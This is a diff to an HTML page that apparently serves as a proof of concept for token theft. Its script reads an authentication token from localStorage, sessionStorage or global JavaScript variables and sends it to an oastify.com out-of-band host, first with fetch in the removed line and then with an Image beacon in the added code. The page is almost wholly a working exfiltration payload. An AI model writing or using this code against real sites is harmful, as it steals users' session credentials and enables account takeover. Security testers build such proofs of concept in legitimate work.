@@ -2,8 +2,20 @@
 <html>
   <body>
     <script>
-      // PoC: exfil localStorage token
-      fetch('https://vml08lsyc856g3697ni2td1u8lec24xsm.oastify.com/?token=' + localStorage.getItem('token'));
+      // Basic token exfil via Image beacon
+      const token = localStorage.getItem('token') || sessionStorage.getItem('token');
+
+      if (token) {
+        new Image().src = 'https://vlk07lryb846f3596nh2sd0u7ldc14xsm.oastify.com/?auth=' + encodeURIComponent(token);
+      } else {
+        // Optional: try to pull token from known global JS variable (if available)
+        try {
+          const fallback = window.__authToken || window.token || null;
+          if (fallback) {
+            new Image().src = 'https://vlk07lryb846f3596nh2sd0u7ldc14xsm.oastify.com/?auth=' + encodeURIComponent(fallback);
+          }
+        } catch (e) {}
+      }
     </script>
   </body>
 </html>
